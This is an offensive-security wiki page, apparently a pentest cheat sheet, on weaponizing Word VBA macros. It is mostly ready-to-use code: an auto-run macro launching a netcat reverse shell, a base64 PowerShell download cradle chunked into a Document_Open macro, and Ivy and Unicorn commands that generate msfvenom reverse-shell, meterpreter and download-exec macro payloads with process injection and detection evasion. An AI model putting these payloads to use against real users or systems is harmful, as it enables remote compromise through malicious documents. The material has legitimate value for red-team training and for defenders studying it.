# VBA (Macro)

## Theory

This technique will build a primitive word document that will auto execute the VBA Macros code once the Macros protection is disabled.

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.

{% hint style="info" %}
VBAs/macros by themselves do not inherently bypass any detection.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Basic Usage" %}
1 - Create new word document (CTRL+N)\
2 - Hit ALT+F11 to go into Macro editor\
3 - Double click into the "This document" and CTRL+C/V the below:

```vba
'Macro
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```

```bash
#C:\tools\shell.cmd
C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
```

4 - ALT+F11 to switch back to the document editing mode\
5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.

{% hint style="danger" %}
Using the newer **.docx**  extension, we can't embed or save the macro in the document. The macro will not be persistent.
{% endhint %}
{% endtab %}

{% tab title="ActiveX Macro" %}
We may leverage ActiveX Objects which provide access to underlying operating system commands using the following VBA template. This can be achieved with WScript through the [Windows Script Host Shell](wsh.md) object.

Fisrt, create a base64 powershell payload

```bash
$ echo -n 'iex(iwr http://192.168.45.225/rev.ps1 -UseBasicParsing)'|iconv -t 'utf-16le'|base64 -w0
aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAA...
```

Secondly, we may use this python script to split the base64-encoded string into smaller chunks (50 chars)

{% code title="chunk_vba_payload.py" %}
```python
str = "powershell.exe -nop -w hidden -e aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAA..."
n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
{% endcode %}

```bash
$ python chunk_payload.py 
```

Then, add the following macro in your word document (see [Basic Usage](vba.md#basic-usage)) using the generated payload

```vba
'Macro
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  Dim Str As String
  Str = Str + "powershell.exe -nop -w hidden -e aQBlAHgAKABpAHcAc"
  Str = Str + "gAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQA"
  Str = Str + "uADIAMgA1AC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhA"
  Str = Str + "HMAaQBjAFAAYQByAHMAaQBuAGcAKQA="
  CreateObject("Wscript.Shell").Run Str
End Sub
```
{% endtab %}

{% tab title="Ivy" %}
[Ivy](https://github.com/optiv/Ivy) is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode.

First, we have to generate payload for both x86 and x64 architecture:

```bash
#x64
msfvenom -p -a x64 windows/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> -f raw > stageless64.bin

#x64
msfvenom -p -a x86 windows/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> -f raw > stageless86.bin
```

Now we can generate the malicious js file that will load our payload.

```bash
# Inject mode performs a process injection attack 
# where a new process is spawned in a suspended state and the shellcode is injected into the process
# This is for a Stagless Injected payload spawning notepad.exe
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Inject -process64 C:\\windows\\system32\\notepad.exe -process32 C:\\windows\\SysWOW64\\notepad.exe -O stageless.js 

# The stealthier option is Local. This loads the shellcode directly into the current Office process.
# It comes with additional features to avoid detection 
# This is for a Unhooked Stagless Local payload
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Local -unhook -O stageless.js

# This is for Non-Executable File Types payload
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Local -unhook -O stageless.png
```

We can execute this payload by using cscript.exe or build a loader using MSHTA.exe, Macro downloader, Stylesheet Ivy options:

```bash
# Simply execute payload on the windows target (stageless.png contains js)
cscript //E:jscript stageless.png

#Generate a Js payload and an evil macro for delivery
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Inject -unhook -O stageless.js -delivery macro -url http://ATTACKING_IP

#Generate a Js payload oneliner for BitsAdmin delivery
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.js -url http://ATTACKING_IP -delivery bits -stageless

#Gneerate a XSL payload and oneliner for Stylsheet delivery
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.xsl -url http://ATTACKING_IP -delivery xsl -stageless

#Generate a oneliner and hta payload for MSHTA.exe delivery
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.hta -url http://ATTACKING_IP -delivery hta -stageless
```
{% endtab %}

{% tab title="Unicorn" %}
[Unicorn](https://github.com/trustedsec/unicorn) is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. It can be used to generate a macro.

```bash
# Syntax:
# python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>

# Examples:
# Meterpreter
python unicorn.py windows/meterpreter/reverse_https <ATTACKING_IP> <ATTACKING_PORT> macro

# Reverse Shell
python unicorn.py windows/x64/shell_reverse_tcp <ATTACKING_IP> <ATTACKING_PORT> macro

# Download Exec
python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro

# Custom Powershell script
python unicorn.py evil.ps1 macro

# Custom shellcode
# shellcode should be 0x00 formatted
python unicorn.py <path_to_shellcode.txt> macro
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/weaponization" %}
